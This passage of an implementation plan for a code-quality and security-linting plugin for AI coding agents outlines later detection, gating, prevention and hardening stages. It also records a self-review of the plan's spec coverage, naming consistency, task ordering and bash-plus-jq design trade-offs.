make selftest && make validate && make validate-apguard
git add plugins/sdlc/bin/aisdlc evals/harness/selftest.sh plugins/antipattern-guard
git commit -m "feat: one owner per guard, and deny-with-reason for ask in headless runs (SDLC-003)"
```

---

## Stages 2–6: scope and acceptance only

Each gets its own plan, written when its predecessor's acceptance criteria are green. Recorded
here so the decomposition is visible, not to be implemented from this document.

| Stage | Scope (spec §11.3) | Acceptance |
|---|---|---|
| 2 — fast detection | `post-write --tier=fast`: Ruff, ESLint without type info, pint/php-cs-fixer as report, hadolint, kube-linter, kubeconform, **actionlint and zizmor with `unpinned-uses: hash-pin` (D10: GitHub Actions)**, sqlfluff, squawk, `terraform fmt`; the changed-lines filter (`git diff -U0`), AP-id mapping, the §4.7 message format. GitLab CI (§6.9, AP-CI-006) is explicitly **not** in this stage | fixtures for each tool, including a workflow pinned to a tag → AP-CI-001 blocker; p95 < 2 s; no policy regression |
| 3 — medium detection | `post-write --tier=medium` via `asyncRewake`: PHPStan (`max` for new files), golangci-lint `--new-from-rev`, type-aware ESLint, Pyright, tflint, Checkov per file, Opengrep with the first own rule set; 3 s debounce; the dispatcher's own timeout, because Claude Code does not enforce one for async hooks (§3.2) | findings reach the agent only when new and ≥ `error`; no loop under Z8 |
| 4 — the Stop gate | Psalm taint, `tsc --noEmit`, Checkov per directory, session-diff secret scan, SCA when `allow_network`; loop protection; the final report including lines changed outside finding hunks | `stop-gate` contract green; p95 < 5 min; `advisory`/`balanced`/`strict` behave per §4.6 |
| 5 — prevention | `rules/catalog.yaml` seeded from §8, `scripts/gen-skills`, per-language skills with `paths`, `reference/*.md`, `agent-discipline`, the `security-reviewer` subagent and `/secure-review` with `context: fork` | skill line and token limits hold; security evals ≥ 0.8 and clearly better than without |
| 6 — hardening | Windows exec form with `.exe`, user documentation, benchmarks on three reference repos, marketplace publication, `claude plugin tag` | 1.0 release with the with/without eval report |

Three constraints that must survive into every one of those plans: the catalogue entry, its
detector and its `bad`/`good` fixture land **together** (§4.8) — an AP id with no fixture is a
claim, not a check; no rule text is copied from Semgrep Registry or SonarSource (§10); and no
catalogue entry duplicates an architecture rule. Per-framework *syntactic* rules are this
plugin's subject; dependency direction between components is enforced as a test in the project's
suite, owned by `specs/SDLC-004/spec.md`. A rule checked in two places gives the agent two
verdicts to argue with, and the one it can silence is the one it will silence.

---

## Self-Review

**Spec coverage (this plan).** §0 — Stage D and the English-only, no-extra-features constraints.
§1–2 — Global Constraints (Z1–Z8). §3 — Task 1.1's I/O contract, Task 0.1's manifest limits,
Task 1.5's note that a plugin cannot set permissions. §4.1–4.2 — Task 0.1. §4.3 — hooks added
per handler in Tasks 1.2–1.5. §4.5–4.6 — Task 1.1. §6 configs — Task 0.3. §7.1 — Task 1.3.
§7.2 — Task 1.4. §7.3–7.4 — Task 1.5. §9 — Task 0.2 and 0.3. §10 — Task 0.1. §11.1.2 — the
contract tests in Tasks 1.3–1.5. §11.2 — Stage 1 acceptance. §11.3 — Stages 0 and 1 in full,
2–6 outlined. §12 — Stage D. Sections §5, §6 per-tool invocations, §8 catalogue and §11.1.3
fixtures belong to Stages 2–5 and are deliberately deferred with their acceptance criteria
recorded.

**Spec coverage (`specs/SDLC-003/spec.md`).** UC-1, UC-2 → Task H.2. UC-3, UC-4 → Task H.1.
UC-5, UC-6 → Task H.3 step 1. UC-7 → Task H.3 steps 2–4. UC-8 → already fixed: the
project-agnostic CI grep matched `docs/antipattern-guard-spec.md:1789`, and that line no longer
names an organisation.

**Placeholder scan.** No "TBD" and no "add error handling". Where the spec gives content verbatim
(§4.2, §4.3, §6, §7.4, §9.2) the step says copy it exactly rather than paraphrasing it into a
second, drifting copy. Version numbers and sha256 values in `tools.lock.json` are resolved during
Task 0.2 by the implementer against the real registries — they cannot be invented here, and the
step says how they are pinned and what rejects a bad one.

**Type consistency.** The subcommand names are `session-start`, `pre-bash`, `pre-write`,
`pre-read`, `post-write --tier=fast|medium`, `stop-gate`, `doctor`, `scan` — identical in spec
§4.4, in `hooks/hooks.json`, and in every task. Shell library names are `lib/hook.sh`,
`lib/state.sh`, `lib/finding.sh`, `lib/tools.sh`, `lib/detect.sh`, `lib/shellsplit.sh`,
`lib/secrets.sh`, `lib/typosquat.sh` — the same set in Tasks 0.2, 1.1–1.4 and in the
`validate-apguard` glob. The helper names are `hook_input`, `hook_field`, `hook_deny`, `hook_ask`,
`hook_allow`, `hook_context`, `hook_message`, `resolve_tool`, `install_tool`, `finding_add`. The
finding shape and its fingerprint are defined once, in Task 1.1, and used by Stages 2–4.
`userConfig` keys reach hooks as `CLAUDE_PLUGIN_OPTION_<KEY>`. The headless marker is
`AISDLC_HEADLESS=1` in Task H.3 steps 2, 3 and 4.

**Ordering.** Stage D is answered, so Stage 0 starts immediately. Stage 0 has no dependency on
Stage H. Stage H must land before Stage 1 ships, so CI lints the shell the moment it exists.
Tasks 1.1 → 1.2 → 1.3/1.4/1.5 share `bin/apguard`, `hooks/hooks.json` and `lib/`, so they run
sequentially, not in parallel.

**What D1 costs, recorded so nobody rediscovers it.** Three consequences of bash + `jq`, each
with its mitigation already in a task: JSON encoding by hand is a defect waiting to happen, so
every response goes through `jq -n --arg` (Task 1.1 step 2); `jq` becomes a pinned product
dependency rather than an assumption, because a missing `jq` would turn fail-closed policies into
no-ops (Task 0.2 step 2); and `flock` is unavailable on macOS, so locking is `mkdir`-based
(Task 1.1 step 3). Windows remains a wrapper problem for Stage 6 — the spec's exec-form
requirement (§3.1) means `bin/apguard` cannot be a shell script there, and the honest options are
a `.cmd` launcher calling Git Bash or declaring Windows unsupported in 1.0.
